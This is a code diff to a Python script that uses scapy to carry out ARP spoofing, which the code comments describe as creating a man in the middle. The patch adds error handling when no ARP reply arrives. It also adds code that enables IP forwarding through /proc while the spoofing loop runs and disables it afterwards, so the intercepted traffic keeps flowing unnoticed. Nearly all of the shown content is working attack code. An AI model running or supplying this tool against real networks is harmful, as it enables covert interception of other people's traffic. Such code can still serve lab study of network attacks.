@@ -23,7 +23,10 @@ def get_mac(ip):
     broadcast   = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Ethernet object creation, set destination MAC to broadcast MAC
     arp_request_broadcast = broadcast/arp_request # Combine into a single packet
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # Send packets with custom Ether, send packet and receive response. "timeout": Time to wait for response
-    return answered_list[0][1].hwsrc
+    try:
+        return answered_list[0][1].hwsrc
+    except IndexError:
+        print("[!] No response..")
 
 # function that creates a man in the middle
 def spoof(target_ip, spoof_ip):
@@ -50,6 +53,8 @@ options = get_arguments()
 target  = options.target
 source  = options.source
 try:
+    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+        f.write("1")  # enable ip forwarding to allow flow of packets through machine
     while True:
         spoof(target, source)
         spoof(source, target)
@@ -61,3 +66,5 @@ except KeyboardInterrupt:
     restore(target, source)
     restore(source, target)
     print("[+] Done!")
+    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+        f.write("0")  # disable ip forwarding
